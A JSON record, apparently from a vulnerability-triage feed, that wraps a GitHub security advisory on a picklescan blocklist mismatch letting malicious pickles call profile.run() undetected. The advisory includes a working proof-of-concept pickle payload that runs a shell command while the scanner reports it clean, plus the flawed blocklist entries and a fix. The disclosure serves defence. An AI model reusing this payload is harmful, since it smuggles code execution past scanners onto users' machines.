@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/29672519?v=4\", \"events_url\": \"https://api.github.com/users/yash2998chhabria/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/yash2998chhabria/followers\", \"following_url\": \"https://api.github.com/users/yash2998chhabria/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/yash2998chhabria/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/yash2998chhabria\", \"id\": 29672519, \"login\": \"yash2998chhabria\", \"node_id\": \"MDQ6VXNlcjI5NjcyNTE5\", \"organizations_url\": \"https://api.github.com/users/yash2998chhabria/orgs\", \"received_events_url\": \"https://api.github.com/users/yash2998chhabria/received_events\", \"repos_url\": \"https://api.github.com/users/yash2998chhabria/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/yash2998chhabria/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/yash2998chhabria/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/yash2998chhabria\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53873\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-184\", \"name\": \"Incomplete List of Disallowed Inputs\"}, {\"cwe_id\": \"CWE-697\", \"name\": \"Incorrect Comparison\"}], \"description\": \"## Summary\\n\\npicklescan v1.0.3 blocks `profile.Profile.run` and `profile.Profile.runctx` but does NOT block the module-level `profile.run()` function. A malicious pickle calling `profile.run(statement)` achieves arbitrary code execution via `exec()` while picklescan reports 0 issues. This is because the blocklist entry `\\\"Profile.run\\\"` does not match the pickle global name `\\\"run\\\"`.\\n\\n## Severity\\n\\n**High** — Direct code execution via `exec()` with zero scanner detection.\\n\\n## Affected Versions\\n\\n- picklescan v1.0.3 (latest — the profile entries were added in recent versions)\\n- Earlier versions also affected (profile not blocked at all)\\n\\n## Details\\n\\n### Root Cause\\n\\nIn `scanner.py` line 199, the blocklist entry for `profile` is:\\n\\n```python\\n\\\"profile\\\": {\\\"Profile.run\\\", \\\"Profile.runctx\\\"},\\n```\\n\\nWhen a pickle file imports `profile.run` (the module-level function), picklescan's opcode parser extracts:\\n- `module = \\\"profile\\\"`\\n- `name = \\\"run\\\"`\\n\\nThe blocklist check at line 414 is:\\n\\n```python\\nelif unsafe_filter is not None and (unsafe_filter == \\\"*\\\" or g.name in unsafe_filter):\\n```\\n\\nThis checks: is `\\\"run\\\"` in `{\\\"Profile.run\\\", \\\"Profile.runctx\\\"}`?\\n\\n**Answer: NO.** `\\\"run\\\" != \\\"Profile.run\\\"`. The string comparison is exact — there is no prefix/suffix matching.\\n\\n### What `profile.run()` Does\\n\\n```python\\n# From Python's Lib/profile.py\\ndef run(statement, filename=None, sort=-1):\\n    prof = Profile()\\n    try:\\n        prof.run(statement)  # Calls exec(statement)\\n    except SystemExit:\\n        pass\\n    ...\\n```\\n\\n`profile.run(statement)` calls `exec(statement)` internally, enabling arbitrary Python code execution.\\n\\n### Proof of Concept\\n\\n```python\\nimport struct, io, pickle\\n\\ndef sbu(s):\\n    b = s.encode()\\n    return b\\\"\\\\x8c\\\" + struct.pack(\\\"<B\\\", len(b)) + b\\n\\n# profile.run(\\\"import os; os.system('id')\\\")\\npayload = (\\n    b\\\"\\\\x80\\\\x04\\\\x95\\\" + struct.pack(\\\"<Q\\\", 60)\\n    + sbu(\\\"profile\\\") + sbu(\\\"run\\\") + b\\\"\\\\x93\\\"\\n    + sbu(\\\"import os; os.system('id')\\\")\\n    + b\\\"\\\\x85\\\" + b\\\"R\\\" + b\\\".\\\"\\n)\\n\\n# picklescan: 0 issues (name \\\"run\\\" not in {\\\"Profile.run\\\", \\\"Profile.runctx\\\"})\\nfrom picklescan.scanner import scan_pickle_bytes\\nresult = scan_pickle_bytes(io.BytesIO(payload), \\\"test.pkl\\\")\\nassert result.issues_count == 0  # CLEAN!\\n\\n# Execute: runs exec(\\\"import os; os.system('id')\\\") → RCE\\npickle.loads(payload)\\n```\\n\\n### Comparison\\n\\n| Pickle Global | Blocklist Entry | Match? | Result |\\n|--------------|-----------------|--------|--------|\\n| `(\\\"profile\\\", \\\"run\\\")` | `\\\"Profile.run\\\"` | NO — `\\\"run\\\" != \\\"Profile.run\\\"` | CLEAN (bypass!) |\\n| `(\\\"profile\\\", \\\"Profile.run\\\")` | `\\\"Profile.run\\\"` | YES | DETECTED |\\n| `(\\\"profile\\\", \\\"runctx\\\")` | `\\\"Profile.runctx\\\"` | NO — `\\\"runctx\\\" != \\\"Profile.runctx\\\"` | CLEAN (bypass!) |\\n\\nThe pickle opcode `GLOBAL` / `STACK_GLOBAL` resolves `profile.run` to the MODULE-LEVEL function, not the class method `Profile.run`. These are different Python objects but both execute arbitrary code.\\n\\n## Impact\\n\\n`profile.run()` provides direct `exec()` execution. An attacker can execute arbitrary Python code while picklescan reports no issues. This is particularly impactful because `exec()` can import any module and call any function, bypassing the blocklist entirely.\\n\\n## Suggested Fix\\n\\nChange the `profile` blocklist entry from:\\n```python\\n\\\"profile\\\": {\\\"Profile.run\\\", \\\"Profile.runctx\\\"},\\n```\\nto:\\n```python\\n\\\"profile\\\": \\\"*\\\",\\n```\\n\\nOr explicitly add the module-level functions:\\n```python\\n\\\"profile\\\": {\\\"Profile.run\\\", \\\"Profile.runctx\\\", \\\"run\\\", \\\"runctx\\\"},\\n```\\n\\n## Resources\\n\\n- picklescan source: `scanner.py` line 199 (`\\\"profile\\\": {\\\"Profile.run\\\", \\\"Profile.runctx\\\"}`)\\n- picklescan source: `scanner.py` line 414 (exact string match logic)\\n- Python source: `Lib/profile.py` `run()` function — calls `exec()`\", \"epss\": {\"percentage\": 0.0046, \"percentile\": 0.365}, \"ghsa_id\": \"GHSA-7wx9-6375-f5wh\", \"github_reviewed_at\": \"2026-03-03T20:03:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-7wx9-6375-f5wh\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7wx9-6375-f5wh\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53873\"}], \"nvd_published_at\": null, \"published_at\": \"2026-03-03T20:03:35Z\", \"references\": [\"https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-53873\", \"https://www.vulncheck.com/advisories/picklescan-arbitrary-code-execution-via-profile-run-blocklist-bypass\", \"https://github.com/advisories/GHSA-7wx9-6375-f5wh\"], \"repository_advisory_url\": \"https://api.github.com/repos/mmaitre314/picklescan/security-advisories/GHSA-7wx9-6375-f5wh\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/mmaitre314/picklescan\", \"summary\": \"PickleScan's profile.run blocklist mismatch allows exec() bypass\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-18T14:43:21Z\", \"url\": \"https://api.github.com/advisories/GHSA-7wx9-6375-f5wh\", \"vulnerabilities\": [{\"first_patched_version\": \"1.0.4\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"picklescan\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.0.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7wx9-6375-f5wh",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "picklescan: < 1.0.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-53873"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "picklescan"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.201499Z",
+  "provenance": {
+    "content_sha256": "850e51acdbfaf0d368335356c15c3c229f029504a213396859963bd3b6c88f79",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-03-03T20:03:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7wx9-6375-f5wh",
+  "status": "active",
+  "title": "PickleScan's profile.run blocklist mismatch allows exec() bypass",
+  "updated_at": "2026-06-18T14:43:21Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7wx9-6375-f5wh"
+}
